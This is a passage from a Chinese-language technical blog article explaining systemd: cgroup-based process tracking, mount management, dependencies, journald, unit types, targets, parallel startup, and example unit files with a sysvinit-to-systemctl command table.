class="headerlink" title="图 3. 找到正确 pid"></a>图 3. 找到正确 pid</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406092347814.png"></p><p>如果 UpStart 找错了，将 p1<code>作为服务进程的 Pid，那么停止服务的时候，UpStart 会试图杀死 p1</code>进程，而真正的 p1``进程则继续执行。换句话说该服务就失去控制了。</p><p>还有更加特殊的情况。比如，一个 CGI 程序会派生两次，从而脱离了和 Apache 的父子关系。当 Apache 进程被停止后，该 CGI 程序还在继续运行。而我们希望服务停止后，所有由它所启动的相关进程也被停止。</p><p>为了处理这类问题，UpStart 通过 strace 来跟踪 fork、exit 等系统调用，但是这种方法很笨拙，且缺乏可扩展性。systemd 则利用了 Linux 内核的特性即 CGroup 来完成跟踪的任务。当停止服务时，通过查询 CGroup，systemd 可以确保找到所有的相关进程，从而干净地停止服务。</p><p>CGroup 已经出现了很久，它主要用来实现系统资源配额管理。CGroup 提供了类似文件系统的接口，使用方便。当进程创建子进程时，子进程会继承父进程的 CGroup。因此无论服务如何启动新的子进程，所有的这些相关进程都会属于同一个 CGroup，systemd 只需要简单地遍历指定的 CGroup 即可正确地找到所有的相关进程，将它们一一停止即可。</p><h3 id="启动挂载点和自动挂载的管理"><a href="#启动挂载点和自动挂载的管理" class="headerlink" title="启动挂载点和自动挂载的管理"></a>启动挂载点和自动挂载的管理</h3><p>传统的 Linux 系统中，用户可以用&#x2F;etc&#x2F;fstab 文件来维护固定的文件系统挂载点。这些挂载点在系统启动过程中被自动挂载，一旦启动过程结束，这些挂载点就会确保存在。这些挂载点都是对系统运行至关重要的文件系统，比如 HOME 目录。和 sysvinit 一样，Systemd 管理这些挂载点，以便能够在系统启动时自动挂载它们。Systemd 还兼容&#x2F;etc&#x2F;fstab 文件，您可以继续使用该文件管理挂载点。</p><p>有时候用户还需要动态挂载点，比如打算访问 DVD 内容时，才临时执行挂载以便访问其中的内容，而不访问光盘时该挂载点被取消(umount)，以便节约资源。传统地，人们依赖 autofs 服务来实现这种功能。</p><p>Systemd 内建了自动挂载服务，无需另外安装 autofs 服务，可以直接使用 Systemd 提供的自动挂载管理能力来实现 autofs 的功能。</p><h3 id="实现事务性依赖关系管理"><a href="#实现事务性依赖关系管理" class="headerlink" title="实现事务性依赖关系管理"></a>实现事务性依赖关系管理</h3><p>系统启动过程是由很多的独立工作共同组成的，这些工作之间可能存在依赖关系，比如挂载一个 NFS 文件系统必须依赖网络能够正常工作。Systemd 虽然能够最大限度地并发执行很多有依赖关系的工作，但是类似”挂载 NFS”和”启动网络”这样的工作还是存在天生的先后依赖关系，无法并发执行。对于这些任务，systemd 维护一个”事务一致性”的概念，保证所有相关的服务都可以正常启动而不会出现互相依赖，以至于死锁的情况。</p><h3 id="能够对系统进行快照和恢复"><a href="#能够对系统进行快照和恢复" class="headerlink" title="能够对系统进行快照和恢复"></a>能够对系统进行快照和恢复</h3><p>systemd 支持按需启动，因此系统的运行状态是动态变化的，人们无法准确地知道系统当前运行了哪些服务。Systemd 快照提供了一种将当前系统运行状态保存并恢复的能力。</p><p>比如系统当前正运行服务 A 和 B，可以用 systemd 命令行对当前系统运行状况创建快照。然后将进程 A 停止，或者做其他的任意的对系统的改变，比如启动新的进程 C。在这些改变之后，运行 systemd 的快照恢复命令，就可立即将系统恢复到快照时刻的状态，即只有服务 A，B 在运行。一个可能的应用场景是调试：比如服务器出现一些异常，为了调试用户将当前状态保存为快照，然后可以进行任意的操作，比如停止服务等等。等调试结束，恢复快照即可。</p><p>这个快照功能目前在 systemd 中并不完善，似乎开发人员也没有特别关注它，因此有报告指出它还存在一些使用上的问题，使用时尚需慎重。</p><h3 id="日志服务"><a href="#日志服务" class="headerlink" title="日志服务"></a>日志服务</h3><p>systemd 自带日志服务 journald，该日志服务的设计初衷是克服现有的 syslog 服务的缺点。比如：</p><ul><li>syslog 不安全，消息的内容无法验证。每一个本地进程都可以声称自己是 Apache PID 4711，而 syslog 也就相信并保存到磁盘上。</li><li>数据没有严格的格式，非常随意。自动化的日志分析器需要分析人类语言字符串来识别消息。一方面此类分析困难低效；此外日志格式的变化会导致分析代码需要更新甚至重写。</li></ul><p>Systemd Journal 用二进制格式保存所有日志信息，用户使用 journalctl 命令来查看日志信息。无需自己编写复杂脆弱的字符串分析处理程序。</p><p>Systemd Journal 的优点如下：</p><ul><li>简单性：代码少，依赖少，抽象开销最小。</li><li>零维护：日志是除错和监控系统的核心功能，因此它自己不能再产生问题。举例说，自动管理磁盘空间，避免由于日志的不断产生而将磁盘空间耗尽。</li><li>移植性：日志 文件应该在所有类型的 Linux 系统上可用，无论它使用的何种 CPU 或者字节序。</li><li>性能：添加和浏览 日志 非常快。</li><li>最小资源占用：日志 数据文件需要较小。</li><li>统一化：各种不同的日志存储技术应该统一起来，将所有的可记录事件保存在同一个数据存储中。所以日志内容的全局上下文都会被保存并且可供日后查询。例如一条固件记录后通常会跟随一条内核记录，最终还会有一条用户态记录。重要的是当保存到硬盘上时这三者之间的关系不会丢失。Syslog 将不同的信息保存到不同的文件中，分析的时候很难确定哪些条目是相关的。</li><li>扩展性：日志的适用范围很广，从嵌入式设备到超级计算机集群都可以满足需求。</li><li>安全性：日志 文件是可以验证的，让无法检测的修改不再可能。</li></ul><h2 id="Systemd-的基本概念"><a href="#Systemd-的基本概念" class="headerlink" title="Systemd 的基本概念"></a>Systemd 的基本概念</h2><h3 id="单元的概念"><a href="#单元的概念" class="headerlink" title="单元的概念"></a>单元的概念</h3><p>系统初始化需要做的事情非常多。需要启动后台服务，比如启动 SSHD 服务；需要做配置工作，比如挂载文件系统。这个过程中的每一步都被 systemd 抽象为一个配置单元，即 unit。可以认为一个服务是一个配置单元；一个挂载点是一个配置单元；一个交换分区的配置是一个配置单元；等等。systemd 将配置单元归纳为以下一些不同的类型。然而，systemd 正在快速发展，新功能不断增加。所以配置单元类型可能在不久的将来继续增加。</p><ul><li>service ：代表一个后台服务进程，比如 mysqld。这是最常用的一类。</li><li>socket ：此类配置单元封装系统和互联网中的一个 套接字 。当下，systemd 支持流式、数据报和连续包的 AF_INET、AF_INET6、AF_UNIX socket 。每一个套接字配置单元都有一个相应的服务配置单元 。相应的服务在第一个”连接”进入套接字时就会启动(例如：nscd.socket 在有新连接后便启动 nscd.service)。</li><li>device ：此类配置单元封装一个存在于 Linux 设备树中的设备。每一个使用 udev 规则标记的设备都将会在 systemd 中作为一个设备配置单元出现。</li><li>mount ：此类配置单元封装文件系统结构层次中的一个挂载点。Systemd 将对这个挂载点进行监控和管理。比如可以在启动时自动将其挂载；可以在某些条件下自动卸载。Systemd 会将&#x2F;etc&#x2F;fstab 中的条目都转换为挂载点，并在开机时处理。</li><li>automount ：此类配置单元封装系统结构层次中的一个自挂载点。每一个自挂载配置单元对应一个挂载配置单元 ，当该自动挂载点被访问时，systemd 执行挂载点中定义的挂载行为。</li><li>swap: 和挂载配置单元类似，交换配置单元用来管理交换分区。用户可以用交换配置单元来定义系统中的交换分区，可以让这些交换分区在启动时被激活。</li><li>target ：此类配置单元为其他配置单元进行逻辑分组。它们本身实际上并不做什么，只是引用其他配置单元而已。这样便可以对配置单元做一个统一的控制。这样就可以实现大家都已经非常熟悉的运行级别概念。比如想让系统进入图形化模式，需要运行许多服务和配置命令，这些操作都由一个个的配置单元表示，将所有这些配置单元组合为一个目标(target)，就表示需要将这些配置单元全部执行一遍以便进入目标所代表的系统运行状态。 (例如：multi-user.target 相当于在传统使用 SysV 的系统中运行级别 5)，这个 target 实际上就是</li><li>timer：定时器配置单元用来定时触发用户定义的操作，这类配置单元取代了 atd、crond 等传统的定时服务。</li><li>snapshot ：与 target 配置单元相似，快照是一组配置单元。它保存了系统当前的运行状态。</li></ul><p>每个配置单元都有一个对应的配置文件，系统管理员的任务就是编写和维护这些不同的配置文件，比如一个 MySQL 服务对应一个 mysql.service 文件。这种配置文件的语法非常简单，用户不需要再编写和维护复杂的系统 5 脚本了。</p><h3 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB" title="依赖关系"></a>依赖关系</h3><p>虽然 systemd 将大量的启动工作解除了依赖，使得它们可以并发启动。但还是存在有些任务，它们之间存在天生的依赖，不能用”套接字激活”(socket activation)、D-Bus activation 和 autofs 三大方法来解除依赖（三大方法详情见后续描述）。比如：挂载必须等待挂载点在文件系统中被创建；挂载也必须等待相应的物理设备就绪。为了解决这类依赖问题，systemd 的配置单元之间可以彼此定义依赖关系。</p><p>Systemd 用配置单元定义文件中的关键字来描述配置单元之间的依赖关系。比如：unit A 依赖 unit B，可以在 unit B 的定义中用”require A”来表示。这样 systemd 就会保证先启动 A 再启动 B。</p><h3 id="Systemd-事务"><a href="#Systemd-事务" class="headerlink" title="Systemd 事务"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#Systemd-%E4%BA%8B%E5%8A%A1" title="Systemd 事务"></a>Systemd 事务</h3><p>Systemd 能保证事务完整性。Systemd 的事务概念和数据库中的有所不同，主要是为了保证多个依赖的配置单元之间没有环形引用。比如 unit A、B、C，假如它们的依赖关系为:</p><h5 id="图-4-Unit-的循环依赖"><a href="#图-4-Unit-的循环依赖" class="headerlink" title="图 4, Unit 的循环依赖"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#%E5%9B%BE-4-Unit-%E7%9A%84%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96" title="图 4, Unit 的循环依赖"></a>图 4, Unit 的循环依赖</h5><p><img src="https://cntsp.github.io/medias/contents/84.png"></p><p>存在循环依赖，那么 systemd 将无法启动任意一个服务。此时 systemd 将会尝试解决这个问题，因为配置单元之间的依赖关系有两种：required 是强依赖；want 则是弱依赖，systemd 将去掉 wants 关键字指定的依赖看看是否能打破循环。如果无法修复，systemd 会报错。</p><p>Systemd 能够自动检测和修复这类配置错误，极大地减轻了管理员的排错负担。</p><h3 id="Target-和运行级别"><a href="#Target-和运行级别" class="headerlink" title="Target 和运行级别"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#Target-%E5%92%8C%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB" title="Target 和运行级别"></a>Target 和运行级别</h3><p>systemd 用目标（target）替代了运行级别的概念，提供了更大的灵活性，如您可以继承一个已有的目标，并添加其它服务，来创建自己的目标。下表列举了 systemd 下的目标和常见 runlevel 的对应关系：</p><h5 id="表-1-Sysvinit-运行级别和-systemd-目标的对应表"><a href="#表-1-Sysvinit-运行级别和-systemd-目标的对应表" class="headerlink" title="表 1. Sysvinit 运行级别和 systemd 目标的对应表"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#%E8%A1%A8-1-Sysvinit-%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB%E5%92%8C-systemd-%E7%9B%AE%E6%A0%87%E7%9A%84%E5%AF%B9%E5%BA%94%E8%A1%A8" title="表 1. Sysvinit 运行级别和 systemd 目标的对应表"></a>表 1. Sysvinit 运行级别和 systemd 目标的对应表</h5><table><thead><tr><th>Sysvinit 运行级别</th><th>Systemd 目标</th><th>备注</th></tr></thead><tbody><tr><td>0</td><td>runlevel0.target, poweroff.target</td><td>关闭系统。</td></tr><tr><td>1, s, single</td><td>runlevel1.target, rescue.target</td><td>单用户模式。</td></tr><tr><td>2, 4</td><td>runlevel2.target, runlevel4.target, multi-user.target</td><td>用户定义&#x2F;域特定运行级别。默认等同于 3。</td></tr><tr><td>3</td><td>runlevel3.target, multi-user.target</td><td>多用户，非图形化。用户可以通过多个控制台或网络登录。</td></tr><tr><td>5</td><td>runlevel5.target, graphical.target</td><td>多用户，图形化。通常为所有运行级别 3 的服务外加图形化登录。</td></tr><tr><td>6</td><td>runlevel6.target, reboot.target</td><td>重启</td></tr><tr><td>emergency</td><td>emergency.target</td><td>紧急 Shell</td></tr></tbody></table><h2 id="Systemd-的并发启动原理"><a href="#Systemd-的并发启动原理" class="headerlink" title="Systemd 的并发启动原理"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#Systemd-%E7%9A%84%E5%B9%B6%E5%8F%91%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86" title="Systemd 的并发启动原理"></a>Systemd 的并发启动原理</h2><p>如前所述，在 Systemd 中，所有的服务都并发启动，比如 Avahi、D-Bus、livirtd、X11、HAL 可以同时启动。乍一看，这似乎有点儿问题，比如 Avahi 需要 syslog 的服务，Avahi 和 syslog 同时启动，假设 Avahi 的启动比较快，所以 syslog 还没有准备好，可是 Avahi 又需要记录日志，这岂不是会出现问题？</p><p>Systemd 的开发人员仔细研究了服务之间相互依赖的本质问题，发现所谓依赖可以分为三个具体的类型，而每一个类型实际上都可以通过相应的技术解除依赖关系。</p><h3 id="并发启动原理之一：解决-socket-依赖"><a href="#并发启动原理之一：解决-socket-依赖" class="headerlink" title="并发启动原理之一：解决 socket 依赖"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#%E5%B9%B6%E5%8F%91%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86%E4%B9%8B%E4%B8%80%EF%BC%9A%E8%A7%A3%E5%86%B3-socket-%E4%BE%9D%E8%B5%96" title="并发启动原理之一：解决 socket 依赖"></a>并发启动原理之一：解决 socket 依赖</h3><p>绝大多数的服务依赖是套接字依赖。比如服务 A 通过一个套接字端口 S1 提供自己的服务，其他的服务如果需要服务 A，则需要连接 S1。因此如果服务 A 尚未启动，S1 就不存在，其他的服务就会得到启动错误。所以传统地，人们需要先启动服务 A，等待它进入就绪状态，再启动其他需要它的服务。Systemd 认为，只要我们预先把 S1 建立好，那么其他所有的服务就可以同时启动而无需等待服务 A 来创建 S1 了。如果服务 A 尚未启动，那么其他进程向 S1 发送的服务请求实际上会被 Linux 操作系统缓存，其他进程会在这个请求的地方等待。一旦服务 A 启动就绪，就可以立即处理缓存的请求，一切都开始正常运行。</p><p>那么服务如何使用由 init 进程创建的套接字呢？</p><p>Linux 操作系统有一个特性，当进程调用 fork 或者 exec 创建子进程之后，所有在父进程中被打开的文件句柄 (file descriptor) 都被子进程所继承。套接字也是一种文件句柄，进程 A 可以创建一个套接字，此后当进程 A 调用 exec 启动一个新的子进程时，只要确保该套接字的 close_on_exec 标志位被清空，那么新的子进程就可以继承这个套接字。子进程看到的套接字和父进程创建的套接字是同一个系统套接字，就仿佛这个套接字是子进程自己创建的一样，没有任何区别。</p><p>这个特性以前被一个叫做 inetd 的系统服务所利用。Inetd 进程会负责监控一些常用套接字端口，比如 Telnet，当该端口有连接请求时，inetd 才启动 telnetd 进程，并把有连接的套接字传递给新的 telnetd 进程进行处理。这样，当系统没有 telnet 客户端连接时，就不需要启动 telnetd 进程。Inetd 可以代理很多的网络服务，这样就可以节约很多的系统负载和内存资源，只有当有真正的连接请求时才启动相应服务，并把套接字传递给相应的服务进程。</p><p>和 inetd 类似，systemd 是所有其他进程的父进程，它可以先建立所有需要的套接字，然后在调用 exec 的时候将该套接字传递给新的服务进程，而新进程直接使用该套接字进行服务即可。</p><h3 id="并发启动原理之二：解决-D-Bus-依赖"><a href="#并发启动原理之二：解决-D-Bus-依赖" class="headerlink" title="并发启动原理之二：解决 D-Bus 依赖"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#%E5%B9%B6%E5%8F%91%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86%E4%B9%8B%E4%BA%8C%EF%BC%9A%E8%A7%A3%E5%86%B3-D-Bus-%E4%BE%9D%E8%B5%96" title="并发启动原理之二：解决 D-Bus 依赖"></a>并发启动原理之二：解决 D-Bus 依赖</h3><p>D-Bus 是 desktop-bus 的简称，是一个低延迟、低开销、高可用性的进程间通信机制。它越来越多地用于应用程序之间通信，也用于应用程序和操作系统内核之间的通信。很多现代的服务进程都使用D-Bus 取代套接字作为进程间通信机制，对外提供服务。比如简化 Linux 网络配置的 NetworkManager 服务就使用 D-Bus 和其他的应用程序或者服务进行交互：邮件客户端软件 evolution 可以通过 D-Bus 从 NetworkManager 服务获取网络状态的改变，以便做出相应的处理。</p><p>D-Bus 支持所谓”bus activation”功能。如果服务 A 需要使用服务 B 的 D-Bus 服务，而服务 B 并没有运行，则 D-Bus 可以在服务 A 请求服务 B 的 D-Bus 时自动启动服务 B。而服务 A 发出的请求会被 D-Bus 缓存，服务 A 会等待服务 B 启动就绪。利用这个特性，依赖 D-Bus 的服务就可以实现并行启动。</p><h3 id="并发启动原理之三：解决文件系统依赖"><a href="#并发启动原理之三：解决文件系统依赖" class="headerlink" title="并发启动原理之三：解决文件系统依赖"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#%E5%B9%B6%E5%8F%91%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86%E4%B9%8B%E4%B8%89%EF%BC%9A%E8%A7%A3%E5%86%B3%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E4%BE%9D%E8%B5%96" title="并发启动原理之三：解决文件系统依赖"></a>并发启动原理之三：解决文件系统依赖</h3><p>系统启动过程中，文件系统相关的活动是最耗时的，比如挂载文件系统，对文件系统进行磁盘检查（fsck），磁盘配额检查等都是非常耗时的操作。在等待这些工作完成的同时，系统处于空闲状态。那些想使用文件系统的服务似乎必须等待文件系统初始化完成才可以启动。但是 systemd 发现这种依赖也是可以避免的。</p><p>Systemd 参考了 autofs 的设计思路，使得依赖文件系统的服务和文件系统本身初始化两者可以并发工作。autofs 可以监测到某个文件系统挂载点真正被访问到的时候才触发挂载操作，这是通过内核 automounter 模块的支持而实现的。比如一个 open()系统调用作用在”&#x2F;misc&#x2F;cd&#x2F;file1”的时候，&#x2F;misc&#x2F;cd 尚未执行挂载操作，此时 open()调用被挂起等待，Linux 内核通知 autofs，autofs 执行挂载。这时候，控制权返回给 open()系统调用，并正常打开文件。</p><p>Systemd 集成了 autofs 的实现，对于系统中的挂载点，比如&#x2F;home，当系统启动的时候，systemd 为其创建一个临时的自动挂载点。在这个时刻&#x2F;home 真正的挂载设备尚未启动好，真正的挂载操作还没有执行，文件系统检测也还没有完成。可是那些依赖该目录的进程已经可以并发启动，他们的 open()操作被内建在 systemd 中的 autofs 捕获，将该 open()调用挂起（可中断睡眠状态）。然后等待真正的挂载操作完成，文件系统检测也完成后，systemd 将该自动挂载点替换为真正的挂载点，并让 open()调用返回。由此，实现了那些依赖于文件系统的服务和文件系统本身同时并发启动。</p><p>当然对于”&#x2F;“根目录的依赖实际上一定还是要串行执行，因为 systemd 自己也存放在&#x2F;之下，必须等待系统根目录挂载检查好。</p><p>不过对于类似&#x2F;home 等挂载点，这种并发可以提高系统的启动速度，尤其是当&#x2F;home 是远程的 NFS 节点，或者是加密盘等，需要耗费较长的时间才可以准备就绪的情况下，因为并发启动，这段时间内，系统并不是完全无事可做，而是可以利用这段空余时间做更多的启动进程的事情，总的来说就缩短了系统启动时间。</p><h2 id="Systemd-的使用"><a href="#Systemd-的使用" class="headerlink" title="Systemd 的使用"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#Systemd-%E7%9A%84%E4%BD%BF%E7%94%A8" title="Systemd 的使用"></a>Systemd 的使用</h2><p>下面针对技术人员的不同角色来简单地介绍一下 systemd 的使用。本文只打算给出简单的描述，让您对 systemd 的使用有一个大概的理解。具体的细节内容太多，即无法在一篇短文内写全，本人也没有那么强大的能力。还需要读者自己去进一步查阅 systemd 的文档。</p><h3 id="系统软件开发人员"><a href="#系统软件开发人员" class="headerlink" title="系统软件开发人员"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98" title="系统软件开发人员"></a>系统软件开发人员</h3><p>开发人员需要了解 systemd 的更多细节。比如您打算开发一个新的系统服务，就必须了解如何让这个服务能够被 systemd 管理。这需要您注意以下这些要点：</p><ul><li>后台服务进程代码不需要执行两次派生来实现后台精灵进程，只需要实现服务本身的主循环即可。</li><li>不要调用 setsid()，交给 systemd 处理</li><li>不再需要维护 pid 文件。</li><li>Systemd 提供了日志功能，服务进程只需要输出到 stderr 即可，无需使用 syslog。</li><li>处理信号 SIGTERM，这个信号的唯一正确作用就是停止当前服务，不要做其他的事情。</li><li>SIGHUP 信号的作用是重启服务。</li><li>需要套接字的服务，不要自己创建套接字，让 systemd 传入套接字。</li><li>使用 sd_notify()函数通知 systemd 服务自己的状态改变。一般地，当服务初始化结束，进入服务就绪状态时，可以调用它。</li></ul><p><strong>Unit 文件的编写</strong></p><p>对于开发者来说，工作量最大的部分应该是编写配置单元文件，定义所需要的单元。</p><p>举例来说，开发人员开发了一个新的服务程序，比如 httpd，就需要为其编写一个配置单元文件以便该服务可以被 systemd 管理，类似 UpStart 的工作配置文件。在该文件中定义服务启动的命令行语法，以及和其他服务的依赖关系等。</p><p>此外我们之前已经了解到，systemd 的功能繁多，不仅用来管理服务，还可以管理挂载点，定义定时任务等。这些工作都是由编辑相应的配置单元文件完成的。我在这里给出几个配置单元文件的例子。</p><p>下面是 SSH 服务的配置单元文件，服务配置单元文件以.service 为文件名后缀。</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs julia"><span class="hljs-string">`#cat /etc/system/system/sshd.service`</span><span class="hljs-string">`[Unit]`</span><span class="hljs-string">`Description=OpenSSH server daemon`</span><span class="hljs-string">`[Service]`</span><span class="hljs-string">`EnvironmentFile=/etc/sysconfig/sshd`</span><span class="hljs-string">`ExecStartPre=/usr/sbin/sshd-keygen`</span><span class="hljs-string">`ExecStart=/usrsbin/sshd –D <span class="hljs-variable">$OPTIONS</span>`</span><span class="hljs-string">`ExecReload=/bin/kill –HUP <span class="hljs-variable">$MAINPID</span>`</span><span class="hljs-string">`KillMode=process`</span><span class="hljs-string">`Restart=on-failure`</span><span class="hljs-string">`RestartSec=42s`</span><span class="hljs-string">`[Install]`</span><span class="hljs-string">`WantedBy=multi-user.target`</span><br></code></pre></td></tr></table></figure><p>文件分为三个小节。第一个是[Unit]部分，这里仅仅有一个描述信息。第二部分是 Service 定义，其中，ExecStartPre 定义启动服务之前应该运行的命令；ExecStart 定义启动服务的具体命令行语法。第三部分是[Install]，WangtedBy 表明这个服务是在多用户模式下所需要的。</p><p>那我们就来看下 multi-user.target 吧：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">`#cat multi-user.target``[Unit]``<span class="hljs-attribute">Description</span>=Multi-User System``<span class="hljs-attribute">Documentation</span>=man.systemd.special(7)``Requires=basic.target``Conflicts=rescue.service rescure.target``<span class="hljs-attribute">After</span>=basic.target rescue.service rescue.target``<span class="hljs-attribute">AllowIsolate</span>=<span class="hljs-literal">yes</span>``[Install]``<span class="hljs-attribute">Alias</span>=default.target`<br></code></pre></td></tr></table></figure><p>第一部分中的 Requires 定义表明 multi-user.target 启动的时候 basic.target 也必须被启动；另外 basic.target 停止的时候，multi-user.target 也必须停止。如果您接着查看 basic.target 文件，会发现它又指定了 sysinit.target 等其他的单元必须随之启动。同样 sysinit.target 也会包含其他的单元。采用这样的层层链接的结构，最终所有需要支持多用户模式的组件服务都会被初始化启动好。</p><p>在[Install]小节中有 Alias 定义，即定义本单元的别名，这样在运行 systemctl 的时候就可以使用这个别名来引用本单元。这里的别名是 default.target，比 multi-user.target 要简单一些。。。</p><p>此外在&#x2F;etc&#x2F;systemd&#x2F;system 目录下还可以看到诸如*.wants 的目录，放在该目录下的配置单元文件等同于在[Unit]小节中的 wants 关键字，即本单元启动时，还需要启动这些单元。比如您可以简单地把您自己写的 foo.service 文件放入 multi-user.target.wants 目录下，这样每次都会被默认启动了。</p><p>最后，让我们来看看 sys-kernel-debug.mout 文件，这个文件定义了一个文件挂载点：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">`#cat sys-kernel-debug.mount`</span><span class="hljs-string">`[Unit]`</span><span class="hljs-string">`Description=Debug File Syste`</span><span class="hljs-string">`DefaultDependencies=no`</span><span class="hljs-string">`ConditionPathExists=/sys/kernel/debug`</span><span class="hljs-string">`Before=sysinit.target`</span><span class="hljs-string">`[Mount]`</span><span class="hljs-string">`What=debugfs`</span><span class="hljs-string">`Where=/sys/kernel/debug`</span><span class="hljs-string">`Type=debugfs`</span><br></code></pre></td></tr></table></figure><p>这个配置单元文件定义了一个挂载点。挂载配置单元文件有一个[Mount]配置小节，里面配置了 What，Where 和 Type 三个数据项。这都是挂载命令所必须的，例子中的配置等同于下面这个挂载命令：</p><p>mount –t debugfs &#x2F;sys&#x2F;kernel&#x2F;debug debugfs</p><p>配置单元文件的编写需要很多的学习，必须参考 systemd 附带的 man 等文档进行深入学习。希望通过上面几个小例子，大家已经了解配置单元文件的作用和一般写法了。</p><h3 id="系统管理员"><a href="#系统管理员" class="headerlink" title="系统管理员"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98" title="系统管理员"></a>系统管理员</h3><p>systemd 的主要命令行工具是 systemctl。</p><p>多数管理员应该都已经非常熟悉系统服务和 init 系统的管理，比如 service、chkconfig 以及 telinit 命令的使用。systemd 也完成同样的管理任务，只是命令工具 systemctl 的语法有所不同而已，因此用表格来对比 systemctl 和传统的系统管理命令会非常清晰。</p><h5 id="表-2-Systemd-命令和-sysvinit-命令的对照表"><a href="#表-2-Systemd-命令和-sysvinit-命令的对照表" class="headerlink" title="表 2. Systemd 命令和 sysvinit 命令的对照表"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-Systemd/#%E8%A1%A8-2-Systemd-%E5%91%BD%E4%BB%A4%E5%92%8C-sysvinit-%E5%91%BD%E4%BB%A4%E7%9A%84%E5%AF%B9%E7%85%A7%E8%A1%A8" title="表 2. Systemd 命令和 sysvinit 命令的对照表"></a>表 2. Systemd 命令和 sysvinit 命令的对照表</h5><table><thead><tr><th>Sysvinit 命令</th><th>Systemd 命令</th><th>备注</th></tr></thead><tbody><tr><td>service foo start</td><td>systemctl start foo.service</td><td>用来启动一个服务 (并不会重启现有的)</td></tr><tr><td>service foo stop</td><td>systemctl stop foo.service</td><td>用来停止一个服务 (并不会重启现有的)。</td></tr><tr><td>service foo restart</td><td>systemctl restart foo.service</td><td>用来停止并启动一个服务。</td></tr><tr><td>service foo reload</td><td>systemctl reload foo.service</td><td>当支持时，重新装载配置文件而不中断等待操作。</td></tr><tr><td>service foo condrestart</td><td>systemctl condrestart foo.service</td><td>如果服务正在运行那么重启它。</td></tr><tr><td>service foo status</td><td>systemctl status foo.service</td><td>汇报服务是否正在运行。</td></tr><tr><td>ls &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;</td><td>systemctl list-unit-files –type&#x3D;service</td><td>用来列出可以启动或停止的服务列表。</td></tr><tr><td>chkconfig foo on</td><td>systemctl enable foo.service</td><td>在下次启动时或满足其他触发条件时设置服务为启用</td></tr><tr><td>chkconfig foo off</td><td>systemctl disable foo.service</td><td>在下次启动时或满足其他触发条件时设置服务为禁用</td></tr><tr><td>chkconfig foo</td><td>systemctl is-enabled foo.service</td><td>用来检查一个服务在当前环境下被配置为启用还是禁用。</td></tr><tr><td>chkconfig –list</td><td>systemctl list-unit-files –type&#x3D;service</td><td>输出在各个运行级别下服务的启用和禁用情况</td></tr><tr><td>chkconfig foo –list</td><td>ls &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;*.wants&#x2F;foo.service</td><td>用来列出该服务在哪些运行级别下启用和禁用。</td></tr><tr><td>chkconfig foo –add</td><td>systemctl daemon-reload</td><td>当您创建新服务文件或者变更设置时使用。</td></tr><tr><td>telinit 3</td><td>systemctl isolate multi-user.target (OR systemctl isolate runlevel3.target OR telinit 3)</td><td>改变至多用户运行级别。</td></tr></tbody></table><p>除了表 2 列出的常见用法，系统管理员还需要了解其他一些系统配置和管理任务的改变。</p><p>首先我们了解 systemd 